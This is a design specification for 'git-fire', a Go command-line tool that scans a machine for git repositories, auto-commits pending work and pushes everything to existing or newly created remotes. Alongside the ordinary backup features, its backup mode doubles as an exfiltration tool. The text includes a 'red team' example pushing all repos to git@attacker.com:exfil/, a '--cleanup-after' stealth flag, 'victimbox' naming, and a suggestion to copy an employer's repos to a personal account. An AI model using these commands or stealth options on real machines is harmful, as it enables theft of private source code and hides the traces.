# Git Fire - Emergency Git Repository Backup CLI

## Project Overview

**Purpose:** A panic-mode backup tool that discovers all git repositories on your system and safely pushes them to remote locations with intelligent conflict handling.

**Language:** Go 1.21+
**Invocation:** `git-fire` binary (enables `git fire` syntax when in PATH)

### Core Dependencies
```go
// go.mod excerpt
github.com/charmbracelet/bubbletea v0.25.0  // TUI framework
github.com/charmbracelet/lipgloss v0.10.0   // Terminal styling
github.com/spf13/cobra v1.8.0               // CLI framework
github.com/spf13/viper v1.18.0              // Config loading
```

**Note:** We shell out to system `git` binary for all git operations (faster and more reliable than go-git for push operations). go-git dependency removed in favor of native git commands.

---

## Behavioral Specification

### Primary Flow

```
User runs: git-fire [--backup-to <remote>]
    ↓
[PROMPT SCREEN] "Is the building on fire?"
    ├─→ YES → [SCAN] → [DRY RUN] → [PUSH] → [REPORT]
    ├─→ NO → [EXIT]
    └─→ FIRE DRILL → [SCAN] → [DRY RUN REPORT] → [EXIT]

Mode A: Normal Fire (push to existing remotes)
Mode B: Backup to New Remote (push to new location, auto-create repos)
```

#### Step 1: Prompt Screen (10-second timeout)
- Display interactive prompt with countdown and ASCII fire animation
- Accept user input: YES / NO / FIRE DRILL
- Timeout after 10 seconds defaults to NO
- Keyboard: ↑↓ to navigate, Enter to select, Ctrl+C to abort
- ASCII flame animations (2-3 frames) for dramatic effect

#### Step 2: Repository Scanning (Hybrid Strategy)
- **Quick scan first:** Check cached repos + common dev paths (`~/projects`, `~/src`, `~/code`)
- **Background indexing:** Full filesystem scan runs in background on first launch
- **Incremental updates:** Re-scan only changed paths on subsequent runs
- Respect `scan_exclude` patterns (e.g., `.cache`, `node_modules`, `/sys`, `/proc`)
- Extract remotes from each repo's `.git/config`
- Collect branch info (local, remote, tracking status) via git commands
- Run in parallel (goroutine pool) with progress indicator
- Cache results in `~/.config/git-fire/repos-cache.json`
- Timeout: configurable, default 5 minutes

#### Step 3: Dry-Run Analysis
- For each discovered repo, determine action based on config
- Detect branch conflicts (local != remote tip)
- Generate new branch names for conflicts using template
- Calculate total branches to push
- Estimate push time (rough: branches * avg_time_per_push)
- **No git operations executed at this stage**

#### Step 4A: Fire Drill Mode (DRY RUN REPORT)
- Display comprehensive report of what WOULD happen
- Show repos, branches, conflicts, new branches
- **DO NOT EXECUTE any git operations**
- Exit after user reviews report

#### Step 4B: Panic Mode (EXECUTE)
- **Auto-commit uncommitted changes:**
  - For each dirty repo (uncommitted/untracked files), run: `git add -A && git commit -m "git-fire emergency backup - {timestamp}"`
  - Log all auto-commits for reversibility
  - Never skip dirty repos - we want to save ALL work
- Validate auth credentials per-repo (not upfront - too slow)
- For each repo, execute based on configured mode:
  - **Leave Untouched:** Skip entirely
  - **Push Known Branches:** Push only branches that exist on remote
  - **Push All Branches:** Push all local branches, create new on remote
- **On branch conflict (local != remote HEAD):**
  - Create new branch with "fire" in name: `git-fire-backup-{branch}-{iso-timestamp}-{hash}`
  - Push new branch instead of forcing
  - Log conflict resolution for later cleanup
- **Push to remotes:** Push to ALL discovered remotes by default (configurable)
- Handle single repo failures gracefully (log, continue to next)
- Show real-time progress per repo and branch

#### Step 5: Completion Report
- Summary: repos pushed, branches pushed, conflicts resolved
- Failures list (if any)
- Log file location
- Total time elapsed

---

### Backup to New Remote Mode

**Use Cases:**
1. **Emergency backup:** GitHub/GitLab down, backup to alternative server
2. **Account migration:** Leaving company, clone all repos to personal account
3. **Disaster recovery:** Infrastructure compromised, backup to safe location
4. **Red team/pentesting:** Exfiltrate repos during authorized assessment

**Invocation:**
```bash
git-fire --backup-to <git-root-url> --token <api-token>
```

#### Additional Steps for Backup Mode:

**Step 2B: Repository Renaming (after scanning)**
- For each discovered repo, generate new name using template
- Template variables: `{hostname}`, `{username}`, `{repo_name}`, `{date}`, `{time}`
- Default: `{hostname}-{repo_name}`
- Examples:
  - Original: `company-app`
  - New: `victimbox-company-app`
  - Or: `company-app-backup-20260212`

**Step 4C: Backup Push (instead of normal push)**
- For each repo:
  1. Auto-commit uncommitted changes (same as normal mode)
  2. Generate new repo name from template
  3. Auto-create repo on target server (GitHub/GitLab/Gitea API)
  4. Add new remote: `git remote add backup <new-repo-url>`
  5. Push all branches: `git push backup --all`
  6. Push all tags: `git push backup --tags`
  7. **Keep new remote** (unless `--cleanup-after` flag)
  8. Log success/failure

**Step 5B: Backup Completion Report**
- Summary: repos backed up, repos created on target
- New remote locations (URLs)
- Failed backups (if any)
- Manifest file location (JSON with all backup metadata)
- Total time elapsed

**Behavior Differences from Normal Mode:**
- Push to NEW remote location (not existing remotes)
- Auto-create repos on target (requires API token)
- Rename repos to avoid conflicts
- Add new remote to each repo (keeps original remotes intact)
- Generate manifest file with backup metadata

---

## Configuration Specification

### File Location
- Primary: `~/.config/git-fire/config.toml`
- Fallback: `~/.git-fire/config.toml`
- Env override: `GIT_FIRE_CONFIG=/path/to/config.toml`

**Important:** Config is OPTIONAL. Tool works with zero configuration using safe defaults.

### Default Config (optional, user can generate with `git-fire --init`)

```toml
[global]
# Mode for unconfigured repos: "leave-untouched" | "push-known-branches" | "push-all"
default_mode = "push-known-branches"

# Conflict handling: "new-branch" (create backup) | "skip" (don't push)
conflict_strategy = "new-branch"

# Template for new branch names on conflict
# Variables: {branch} (original name), {timestamp} (ISO format), {hash} (commit SHA prefix)
# Example: git-fire-backup-main-2026-02-12T143025-a1b2c3d
branch_name_template = "git-fire-backup-{branch}-{timestamp}-{hash}"

# Push to all discovered remotes by default (not just origin)
push_to_all_remotes = true

# Preferred remote order if push_to_all_remotes = false
preferred_remotes = ["origin", "backup", "upstream"]

# Backup to new remote configuration
[backup]
# Target git server root URL (empty = disabled)
# Examples:
#   git@github.com:username/
#   https://gitlab.com/username/
#   git@gitea.server.com:backup/
#   /mnt/usb/git-backup/  (local filesystem)
target_remote = ""

# Platform type for API calls (github, gitlab, gitea, gogs, none)
platform = "github"

# API token (use env var GIT_FIRE_BACKUP_TOKEN instead of storing here)
api_token_env = "GIT_FIRE_BACKUP_TOKEN"

# Repo naming template
# Variables: {hostname}, {username}, {repo_name}, {date}, {time}, {path_hash}
repo_name_template = "{hostname}-{repo_name}"
prefix = ""  # Alternative to template
suffix = ""  # Alternative to template

# Remote name to add to each repo after successful push
remote_name = "backup"

# Auto-create repos on target (requires API token + platform support)
auto_create_repos = true

# Keep new remote after push (recommended: true for safety)
keep_remote_after_push = true

# Cleanup mode (remove new remote after push - for stealth/red team)
cleanup_after = false

# Make auto-created repos private (recommended: true)
create_private_repos = true

# Filesystem scan settings (hybrid strategy)
# Quick scan paths (checked first, < 5 seconds)
quick_scan_paths = [
  "~/projects",
  "~/src",
  "~/code",
  "~/dev",
  "~/workspace",
  "~/Documents/projects"
]

# Full scan root (only used if --full-scan flag or background indexing)
full_scan_root = "~"  # Home directory, NOT filesystem root "/"

# Exclude patterns (applies to all scans)
scan_exclude = [
  ".cache",
  "node_modules",
  ".venv",
  "venv",
  ".virtualenv",
  "vendor",
  "dist",
  "build",
  "target",
  "/sys",    # System dirs (if scanning from /)
  "/proc",
  "/dev",
  "/mnt",
  "/media"
]

# Max directory depth to scan
scan_max_depth = 10

# Cache discovered repos for fast rescans
repos_cache_file = "~/.config/git-fire/repos-cache.json"
cache_ttl_hours = 24  # Rebuild cache after 24 hours

# Auth settings
[auth]
# SSH key handling: uses system ssh-agent by default
# If SSH key has passphrase, user must run `ssh-add` first
# Passphrase-protected keys without ssh-agent will be skipped

# GitHub/GitLab token for HTTPS auth (use env var instead of config file for security)
# Env vars: GIT_FIRE_GITHUB_TOKEN, GIT_FIRE_GITLAB_TOKEN
# Do NOT store tokens in this file (security risk)

# Timeout for each git operation (seconds)
operation_timeout = 30

# Retry on push failure
retry_attempts = 3
retry_backoff_seconds = 2  # Exponential backoff: 2s, 4s, 8s

# Parallel goroutines for scanning and pushing
parallel_scan_workers = 8
parallel_push_workers = 4

# Logging
[logging]
log_dir = "~/.config/git-fire/logs"
log_level = "info"  # "debug" | "info" | "warn" | "error"
log_retention_days = 30  # Auto-cleanup logs older than 30 days
log_format = "json"  # "json" | "text"

# Per-repository overrides (matched by path or remote URL)
[[repos]]
path = "/home/user/projects/important-project"
mode = "push-all"
conflict_strategy = "new-branch"

[[repos]]
remote_url = "github.com:user/critical-repo"
mode = "push-all"

[[repos]]
path = "/home/user/archive/old-project"
mode = "leave-untouched"

[[repos]]
path = "/home/user/work/client-repo"
mode = "push-known-branches"
conflict_strategy = "skip"  # Don't create new branches for this one
```

### Config Loading Rules (Zero-Config Friendly)
1. Try to load from `GIT_FIRE_CONFIG` env var
2. Try `~/.config/git-fire/config.toml`
3. Try `~/.git-fire/config.toml`
4. **If none exist:** Use safe built-in defaults (works immediately, no setup required)
5. User can optionally run `git-fire --init` to generate config template for customization

**Emergency mode philosophy:** Tool MUST work with zero configuration for first-time users in actual emergencies.

### Per-Repo Matching Logic
- Match by exact `path` first (highest priority)
- Then match by `remote_url` (substring match on origin URL)
- Fall back to `global.default_mode`

---

## Core Data Structures

```go
// Repository represents a discovered git repo
type Repository struct {
    Path          string        // Full filesystem path
    Remotes       []Remote      // All configured remotes
    Branches      []Branch      // All local + remote branches
    IsDirty       bool          // Has uncommitted changes
    Config        RepoConfig    // Resolved config for this repo
    LastError     error         // If scanning failed
}

// Remote represents a git remote
type Remote struct {
    Name       string          // "origin", "upstream", etc.
    URL        string          // Remote URL
    IsValid    bool            // Auth works
    AuthError  string          // If IsValid == false
}

// Branch represents a local or remote branch
type Branch struct {
    Name            string      // Branch name
    IsLocal         bool        // Exists locally
    IsRemote        bool        // Exists on origin
    LocalSHA        string      // Local commit hash
    RemoteSHA       string      // Remote commit hash
    HasDiverged     bool        // Local != remote
    TrackingBranch  string      // "origin/main" etc, empty if untracked
}

// RepoConfig is the resolved config for a single repo
type RepoConfig struct {
    Mode               Mode           // leave-untouched | push-known-branches | push-all
    ConflictStrategy   ConflictStrat  // new-branch | skip
    BranchNameTemplate string
    AutoCreate         bool
}

// PushPlan describes what will happen to a repo
type PushPlan struct {
    Repo              *Repository
    Action            Action              // skip, push, create
    BranchesToPush    []BranchPushPlan
    ConflictsDetected []ConflictInfo
    EstimatedTime     time.Duration
}

// BranchPushPlan describes action for one branch
type BranchPushPlan struct {
    BranchName        string
    Action            Action              // push, new-branch, skip
    NewBranchName     string              // If action == new-branch
    Remote            string              // "origin"
}

// ConflictInfo describes a detected conflict
type ConflictInfo struct {
    BranchName    string
    LocalSHA      string
    RemoteSHA     string
    NewBranchName string  // What we'll create
}

// Config is the full configuration
type Config struct {
    Global      GlobalConfig
    Auth        AuthConfig
    Logging     LoggingConfig
    Backup      BackupConfig
    Repos       []RepoOverride
}

// BackupConfig for backup-to-new-remote mode
type BackupConfig struct {
    TargetRemote        string            // git@github.com:user/ or /mnt/usb/backup/
    Platform            string            // github, gitlab, gitea, gogs, none
    APITokenEnv         string            // Env var name for token
    RepoNameTemplate    string            // Template for renamed repos
    Prefix              string            // Repo name prefix
    Suffix              string            // Repo name suffix
    RemoteName          string            // Name of new remote to add
    AutoCreateRepos     bool              // Auto-create via API
    KeepRemoteAfterPush bool              // Keep new remote (true) or cleanup (false)
    CleanupAfter        bool              // Stealth mode - remove remote after push
    CreatePrivateRepos  bool              // Make created repos private
}

// BackupManifest is the metadata file generated during backup mode
type BackupManifest struct {
    Hostname     string              // System hostname
    Username     string              // Current user
    Timestamp    time.Time           // When backup ran
    TargetRemote string              // Where repos were backed up to
    Repos        []BackupRepoInfo    // Info about each backed up repo
    Summary      BackupSummary       // Overall stats
}

// BackupRepoInfo describes a single backed up repo
type BackupRepoInfo struct {
    OriginalPath      string   // Original filesystem path
    OriginalName      string   // Original repo name
    BackupName        string   // New name on backup server
    BackupURL         string   // Full URL of backed up repo
    Branches          []string // Branches pushed
    Tags              []string // Tags pushed
    TotalCommits      int      // Approximate commit count
    UncommittedFiles  bool     // Had uncommitted changes (auto-committed)
    OriginalRemotes   []string // Original remote names
    BackupSuccess     bool     // Whether backup succeeded
    BackupError       string   // Error message if failed
}

// BackupSummary provides overall stats
type BackupSummary struct {
    TotalRepos        int
    SuccessfulBackups int
    FailedBackups     int
    TotalBranches     int
    TotalTags         int
    DurationSeconds   int
}
```

---

## File Organization

```
git-fire/
├── cmd/
│   └── root.go              # Cobra root command, entry point
├── internal/
│   ├── config/
│   │   ├── loader.go        # LoadConfig, ValidateConfig
│   │   ├── defaults.go      # Default settings
│   │   └── types.go         # Config structs
│   ├── git/
│   │   ├── scanner.go       # ScanRepositories, parallel scanning
│   │   ├── operations.go    # Push, conflict detection, branch ops
│   │   ├── auth.go          # Validate remotes, auth setup
│   │   └── types.go         # Repository, Branch, Remote structs
│   ├── executor/
│   │   ├── planner.go       # Build push plans (dry-run logic)
│   │   ├── runner.go        # Execute push plans (panic mode)
│   │   ├── logger.go        # Structured logging
│   │   └── types.go         # PushPlan, etc.
│   └── ui/
│       ├── prompt.go        # "Is building on fire?" screen
│       ├── scanning.go      # Scanning progress screen
│       ├── pushing.go       # Real-time push progress screen
│       ├── report.go        # Fire drill or completion report
│       ├── styles.go        # Lipgloss styling
│       └── models.go        # Bubble Tea models
├── main.go
├── go.mod
├── go.sum
└── README.md
```

---

## CLI Interface

### Command: `git-fire [PATH] [FLAGS]`

```
USAGE:
  git-fire                   # Interactive mode (normal fire - push to existing remotes)
  git-fire ~/projects        # Scan specific path
  git-fire /path/to/repo     # Scan single repo
  git-fire --backup-to <url> # Backup mode (push to new remote location)

FLAGS:

BACKUP MODE:
  --backup-to URL            Backup all repos to new remote location
                             (enables backup mode instead of normal fire)

  --token TOKEN              API token for auto-creating repos
                             (or use GIT_FIRE_BACKUP_TOKEN env var)

  --platform TYPE            Platform type: github, gitlab, gitea, gogs
                             (default: auto-detect from URL)

  --prefix PREFIX            Prefix for renamed repos (e.g., "backup-")

  --suffix SUFFIX            Suffix for renamed repos (e.g., "-backup")

  --remote-name NAME         Name for new remote (default: "backup")

  --cleanup-after            Remove new remote after push (stealth mode)

  --no-auto-create           Don't auto-create repos (must exist on target)

GENERAL FLAGS:
  -c, --config FILE          Path to config file
                             (default: ~/.config/git-fire/config.toml)

  --dry-run                  Run fire drill without interactive prompt
                             (validates SSH auth, shows what would happen)

  --full-scan                Force full filesystem scan (slow)

  --reindex                  Rebuild repo cache

  --init                     Generate default config file and exit

  --auth-check               Validate SSH auth and exit (shows key status)

  --ssh-passphrase PASS      Single passphrase for all SSH keys

  --ssh-passphrase-rsa PASS  Passphrase for ~/.ssh/id_rsa

  --ssh-passphrase-ed25519   Passphrase for ~/.ssh/id_ed25519

  --ssh-passphrase-ecdsa     Passphrase for ~/.ssh/id_ecdsa

  --quiet                    Suppress output (for cron jobs)

  -v, --verbose              Enable debug logging

  -h, --help                 Show help

  --version                  Show version

ENVIRONMENT VARIABLES:
  GIT_FIRE_CONFIG            Path to config file
  GIT_FIRE_SSH_PASSPHRASE    Single passphrase for all keys
  GIT_FIRE_SSH_PASSPHRASE_RSA      For id_rsa
  GIT_FIRE_SSH_PASSPHRASE_ED25519  For id_ed25519
  GIT_FIRE_SSH_PASSPHRASE_ECDSA    For id_ecdsa
  GIT_FIRE_GITHUB_TOKEN      GitHub token for HTTPS auth
  GIT_FIRE_GITLAB_TOKEN      GitLab token for HTTPS auth
```

### Examples

```bash
# Interactive mode (uses cache + quick paths, FAST)
$ git-fire

# Scan specific path
$ git-fire ~/projects

# Scan single repo
$ git-fire ~/projects/my-app

# Non-interactive dry-run (validates auth, shows what would happen)
$ git-fire --dry-run

# With SSH passphrase (all keys use same passphrase)
$ git-fire --ssh-passphrase "my-passphrase"

# With specific passphrases for different keys
$ git-fire --ssh-passphrase-rsa "pass1" --ssh-passphrase-ed25519 "pass2"

# Using environment variables (recommended for scripting)
$ export GIT_FIRE_SSH_PASSPHRASE="my-passphrase"
$ git-fire

# Check SSH auth status
$ git-fire --auth-check

# Force full filesystem scan (slow, first-time setup)
$ git-fire --full-scan

# Rebuild repo cache
$ git-fire --reindex

# Generate config template
$ git-fire --init

# Quiet mode for cron jobs
$ git-fire --dry-run --quiet

# Emergency alias (unlock SSH, then fire)
$ alias emergency-fire='ssh-add ~/.ssh/id_rsa && git-fire'
$ emergency-fire

# ========== BACKUP TO NEW REMOTE MODE ==========

# Emergency: GitHub down, backup to GitLab
$ git-fire --backup-to git@gitlab.com:mybackup/ \
           --token $GITLAB_TOKEN

# Migration: Leaving company, clone repos to personal account
$ git-fire --backup-to git@github.com:personal/ \
           --token $PERSONAL_GITHUB_TOKEN \
           --prefix "old-company-"

# Red team: Exfiltrate repos (authorized pentest)
$ git-fire --backup-to git@attacker.com:exfil/ \
           --token $TOKEN \
           --prefix "$(hostname)-" \
           --cleanup-after \
           --quiet

# Forensics: Backup to USB drive (no network)
$ git-fire --backup-to /mnt/usb/git-backup/ \
           --prefix "incident-IR2026-"

# Disaster recovery: Company server compromised
$ git-fire --backup-to git@safe-backup.com:emergency/ \
           --token $BACKUP_TOKEN \
           --suffix "-recovery"

# With custom repo naming
$ git-fire --backup-to git@github.com:backup/ \
           --token $TOKEN \
           --prefix "$(hostname)-$(whoami)-"
```

---

## User Interface Screens

### Screen 1: Prompt (Initial with SSH Status)

**Scenario A: All SSH keys unlocked (happy path)**
```
╔════════════════════════════════════════════════════════════════╗
║     (  )   (   )  )                                            ║
║      ) (   )  (  (         🔥 GIT FIRE - PANIC MODE 🔥        ║
║      ( )  (    ) )                                             ║
║                                                                ║
║  SSH Keys: ✓ All unlocked (3/3)                               ║
║                                                                ║
║          Is the building on fire? You have 10 seconds...       ║
║                                                                ║
║                      ► YES, PUSH EVERYTHING                    ║
║                        NO, CANCEL                              ║
║                        FIRE DRILL (DRY RUN)                    ║
║                                                                ║
║  Timer: [████████████████░░░░░░░░░░░░░░░░░░] 10s              ║
╚════════════════════════════════════════════════════════════════╝
```

**Scenario B: Some SSH keys need attention (shows warnings)**
```
╔════════════════════════════════════════════════════════════════╗
║     (  )   (   )  )                                            ║
║      ) (   )  (  (         🔥 GIT FIRE - PANIC MODE 🔥        ║
║      ( )  (    ) )                                             ║
║                                                                ║
║  SSH Keys Detected:                                            ║
║  ✓ id_rsa (unlocked)                                          ║
║  ✗ id_ed25519 (passphrase FAILED - wrong password?)          ║
║  ⚠ id_ecdsa (needs passphrase)                               ║
║                                                                ║
║  ⚠️ WARNING: Some repos may be skipped due to SSH issues!     ║
║                                                                ║
║                      ► YES, PUSH ANYWAY                        ║
║                        NO, CANCEL                              ║
║                        FIX PASSPHRASES NOW                     ║
║                        FIRE DRILL (DRY RUN)                    ║
║                                                                ║
║  Timer: [████████████████░░░░░░░░░░░░░░░░░░] 10s              ║
╚════════════════════════════════════════════════════════════════╝
```

**ASCII Flames:** 2-3 frame animation at top (cycles while countdown runs)

**Controls:**
- ↑↓ arrow keys to navigate
- Enter to select
- Ctrl+C to abort
- Auto-selects NO after 10 seconds

**Options (dynamic based on SSH status):**
1. **YES, PUSH EVERYTHING/ANYWAY** - Proceed with push (may skip repos with auth failures)
2. **NO, CANCEL** - Exit without doing anything
3. **FIX PASSPHRASES NOW** - Enter/correct passphrases interactively (only shown if keys need attention)
4. **FIRE DRILL (DRY RUN)** - Show what would happen, validate SSH auth

---

### Screen 1B: Fix Passphrases (if "FIX PASSPHRASES NOW" selected)

**Step 1: Show problem keys**
```
╔════════════════════════════════════════════════════════════════╗
║  🔐 FIX SSH KEY PASSPHRASES                                    ║
║                                                                ║
║  Keys that need attention:                                     ║
║                                                                ║
║  ✗ id_ed25519 - Passphrase validation FAILED                  ║
║     (You provided a passphrase but it didn't work)            ║
║                                                                ║
║  ⚠ id_ecdsa - Not unlocked                                    ║
║     (No passphrase provided yet)                              ║
║                                                                ║
║  Let's fix these now...                                        ║
║                                                                ║
║  [Enter] Continue  |  [Ctrl+C] Cancel                          ║
╚════════════════════════════════════════════════════════════════╝
```

**Step 2: Enter passphrase with real-time validation**
```
╔════════════════════════════════════════════════════════════════╗
║  🔐 FIX SSH KEY PASSPHRASES                                    ║
║                                                                ║
║  Enter passphrase for id_ed25519:                             ║
║  ► ••••••••••••                                                ║
║                                                                ║
║  [Enter] Test Passphrase  |  [Ctrl+S] Skip  |  [Ctrl+C] Back  ║
╚════════════════════════════════════════════════════════════════╝
```

**Step 3: Validation feedback**
```
╔════════════════════════════════════════════════════════════════╗
║  🔐 FIX SSH KEY PASSPHRASES                                    ║
║                                                                ║
║  Testing passphrase for id_ed25519...                         ║
║  ⠋ Running: ssh-add ~/.ssh/id_ed25519                        ║
║                                                                ║
║  ✓ SUCCESS! Key unlocked and added to ssh-agent.             ║
║                                                                ║
║  [Enter] Continue to next key                                  ║
╚════════════════════════════════════════════════════════════════╝
```

**Step 4: If validation fails**
```
╔════════════════════════════════════════════════════════════════╗
║  🔐 FIX SSH KEY PASSPHRASES                                    ║
║                                                                ║
║  ✗ FAILED: Passphrase incorrect for id_ed25519               ║
║                                                                ║
║  Error from ssh-add:                                           ║
║  "Bad passphrase, try again for ~/.ssh/id_ed25519"           ║
║                                                                ║
║  [Enter] Try Again  |  [Ctrl+S] Skip This Key  |  [Ctrl+C] Back║
╚════════════════════════════════════════════════════════════════╝
```

**Step 5: Summary after fixing**
```
╔════════════════════════════════════════════════════════════════╗
║  🔐 SSH KEY STATUS UPDATED                                     ║
║                                                                ║
║  ✓ id_rsa (already unlocked)                                  ║
║  ✓ id_ed25519 (just unlocked)                                 ║
║  ⚠ id_ecdsa (skipped)                                         ║
║                                                                ║
║  2/3 keys unlocked. Ready to push!                            ║
║                                                                ║
║  [Enter] Return to main prompt                                 ║
╚════════════════════════════════════════════════════════════════╝
```

**Behavior:**
- Prompt for each locked/failed key individually
- **Real-time validation:** Test passphrase immediately with `ssh-add`
- Show success/failure instantly
- Allow retry if validation fails
- Allow skipping individual keys
- Update SSH status table
- Return to main prompt with updated status

**Security:**
- Passphrases only held in memory for `ssh-add` call
- Never logged or written to disk
- Keys added to ssh-agent (system handles security from there)
- Failed passphrases cleared from memory immediately

---

### Screen 2: Scanning Repos

```
╔════════════════════════════════════════════════════════════════╗
║  🔍 SCANNING DISK FOR GIT REPOSITORIES...                      ║
║                                                                ║
║  ⠋ Scanning: /home/user/projects                              ║
║                                                                ║
║  Found: 12 repositories                                        ║
║  Current: /home/user/projects/myproject/.git                  ║
║                                                                ║
║  Progress: [████████████░░░░░░░░░░░░░░░░░░░░░░░] 45%          ║
║  Elapsed: 3s | Est. remaining: 4s                              ║
║                                                                ║
║  Press Ctrl+C to cancel                                        ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
```

**Behavior:**
- Real-time spinner animation
- Progress bar updates as repos found
- Shows current directory being scanned
- Estimate time remaining

### Screen 3A: Fire Drill Report (Dry-Run, No Execute)

```
╔════════════════════════════════════════════════════════════════╗
║  🔥 FIRE DRILL REPORT - DRY RUN MODE                          ║
║     (NOTHING WILL BE PUSHED - THIS IS JUST A PREVIEW)         ║
║                                                                ║
║  📊 SUMMARY                                                    ║
║  ─────────────────────────────────────────────────────────────║
║  Repositories found:        15                                 ║
║  Repositories to push:      12                                 ║
║  Total branches:            34                                 ║
║  Detected conflicts:        2                                  ║
║  New branches to create:    2                                  ║
║  Estimated push time:       ~2m 15s                            ║
║                                                                ║
║  📍 REPOS & BRANCHES TO PUSH                                   ║
║  ─────────────────────────────────────────────────────────────║
║  [PUSH-ALL] /home/user/projects/myproject                     ║
║    └─ main (new)                                               ║
║    └─ feature-x (new)                                          ║
║    └─ dev (new)                                                ║
║                                                                ║
║  [PUSH-KNOWN] /home/user/projects/important-repo              ║
║    └─ main (exists remote)                                     ║
║    └─ hotfix (exists remote, CONFLICT)                        ║
║       → Creating: git-fire-backup-hotfix-1706-abc123          ║
║                                                                ║
║  [SKIP] /home/user/archive/old-project                        ║
║    (configured: leave-untouched)                              ║
║                                                                ║
║  ⚠️  CONFLICTS DETECTED (2)                                    ║
║  ─────────────────────────────────────────────────────────────║
║  myproject / feature-x                                        ║
║    Local:  a1b2c3d (3 commits ahead of remote)                ║
║    Remote: x9y8z7w                                             ║
║    Action: Creating git-fire-backup-feature-x-1706-a1b2      ║
║                                                                ║
║  important-repo / hotfix                                      ║
║    Local:  e4f5g6h (2 commits ahead of remote)                ║
║    Remote: m7n8o9p                                             ║
║    Action: Creating git-fire-backup-hotfix-1706-e4f5         ║
║                                                                ║
║  [SPACE] Page down | [B] Page up | [ENTER] Exit               ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
```

**Behavior:**
- Scrollable report (if long)
- Shows exactly what would be pushed
- Clear indication: "NOTHING WILL BE PUSHED"
- Shows conflict resolution strategy

### Screen 3B: Pushing (Panic Mode Active)

```
╔════════════════════════════════════════════════════════════════╗
║  📤 PUSHING REPOSITORIES...                                    ║
║                                                                ║
║  ✓ myproject                                                   ║
║    ├─ main               [██████████████████░░░░░░] 100% ✓    ║
║    ├─ feature-x          [██████████████████░░░░░░] 100% ✓    ║
║    └─ dev                [████████░░░░░░░░░░░░░░░░] 35%       ║
║                                                                ║
║  ⠙ important-repo                                              ║
║    ├─ main               [██████████░░░░░░░░░░░░░░] 50%       ║
║    └─ hotfix             [░░░░░░░░░░░░░░░░░░░░░░░░] 0%       ║
║       ⚠️ CONFLICT DETECTED                                     ║
║       Creating: git-fire-backup-hotfix-1706-e4f5...          ║
║       Pushing new branch...                                    ║
║                                                                ║
║  ⏳ archive-project       [████░░░░░░░░░░░░░░░░░░░░] 20%      ║
║                                                                ║
║  OVERALL: [██████████████░░░░░░░░░░░░░░░░░░░░░░] 45%          ║
║                                                                ║
║  Complete: 1/3 repos | Branches: 8/34 | Conflicts: 1/2       ║
║  Elapsed: 1m 23s | Est. remaining: 2m 15s                     ║
║                                                                ║
║  Press Ctrl+C to abort (may leave partial state)              ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
```

**Behavior:**
- Real-time progress per branch
- Checkmarks for completed
- Spinner for in-progress
- Conflict detection triggers new branch creation inline
- Overall progress bar
- Remaining time estimate

### Screen 4: Completion Report

```
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║                    ✅ PUSH COMPLETE ✅                         ║
║                                                                ║
║  12 repositories pushed successfully                          ║
║  34 branches pushed                                            ║
║  2 branches created on remote (conflicts resolved)            ║
║  0 failures                                                    ║
║                                                                ║
║  Time elapsed: 2m 34s                                          ║
║                                                                ║
║  📋 Details logged to:                                         ║
║     ~/.config/git-fire/logs/git-fire-2024-02-06-143025.log   ║
║                                                                ║
║  You can now safely escape the building! 🏃‍♂️                   ║
║                                                                ║
║                    Press ENTER to exit                         ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
```

**Behavior:**
- Shows summary of push results
- Lists log file for debugging
- Clean exit message

### Screen 5: Error (Auth Failed Example)

```
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║                    ❌ ERROR - CANNOT PROCEED ❌                ║
║                                                                ║
║  Authentication failed for the following remotes:              ║
║                                                                ║
║  SSH auth issue:                                               ║
║  • origin (github.com:user/repo1) - SSH key not found        ║
║  • upstream (github.com:org/repo2) - Permission denied        ║
║                                                                ║
║  HTTPS auth issue:                                             ║
║  • origin (github.com/user/repo3) - Invalid token            ║
║                                                                ║
║  💡 Fix: Ensure SSH keys are loaded or GitHub token is set   ║
║     $ ssh-add ~/.ssh/id_rsa                                   ║
║     $ export GIT_FIRE_GITHUB_TOKEN=ghp_xxxxx                 ║
║                                                                ║
║  For more help, see: ~/.config/git-fire/logs/               ║
║                                                                ║
║                    Press ENTER to exit                         ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
```

---

## Special Handling

### Uncommitted Changes
**Behavior:** Auto-commit ALL uncommitted/untracked files before pushing.

```bash
# For each dirty repo, execute:
git add -A  # Stage all changes (tracked + untracked)
git commit -m "git-fire emergency backup - 2026-02-12T143025"
```

**Rationale:**
- In panic mode, we want to save ALL work, not just committed changes
- Better to have a messy commit than lose work
- Commit message includes timestamp for easy identification
- All auto-commits are logged for reversibility

**No exceptions:** Even if repo has unstaged changes, untracked files, or is in weird state - commit it all.

### Branch Conflicts
**Behavior:** Never force-push. Always create new branch with "fire" in name.

```bash
# If local branch != remote branch:
git checkout -b git-fire-backup-main-2026-02-12T143025-a1b2c3d
git push origin git-fire-backup-main-2026-02-12T143025-a1b2c3d
```

**Rationale:**
- Safety first: never risk overwriting remote work
- Easy to identify fire branches later (grep for "git-fire")
- Can merge/reconcile conflicts after emergency
- Long branch names are fine - clarity > brevity

### Submodules
**Behavior:** Treat submodules as independent repos (MVP approach).

- During scanning, submodule `.git` directories are discovered like any other repo
- Each submodule is pushed separately to its own remote
- Parent repo's submodule pointers are pushed as-is (may be out of sync)
- No special recursive handling in MVP

**Post-emergency cleanup:** User may need to run `git submodule update` to sync pointers.

**Future enhancement (Phase 2):** Proper recursive submodule push with pointer updates.

### Multiple Remotes
**Behavior:** Push to ALL discovered remotes by default.

```bash
# If repo has: origin, backup, upstream
git push origin <branch>
git push backup <branch>
git push upstream <branch>
```

**Rationale:**
- Maximum redundancy in emergency
- If one remote is down, others still work
- Configurable via `push_to_all_remotes = false` if user wants only specific remotes

### SSH Keys with Passphrases
**Behavior:** Detect passphrase-protected keys and handle them securely.

**Detection strategy:**
1. Scan common SSH key locations: `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, `~/.ssh/id_ecdsa`
2. Check which keys are loaded in ssh-agent: `ssh-add -l`
3. If key not in agent: mark as "needs passphrase"
4. Show user upfront warning if passphrases required

**Preconfiguration Options (Recommended):**
```bash
# Option 1: Add to ssh-agent before running (most secure)
ssh-add ~/.ssh/id_rsa
git-fire

# Option 2: Environment variables (supports multiple keys)
export GIT_FIRE_SSH_PASSPHRASE_RSA="passphrase-for-rsa"
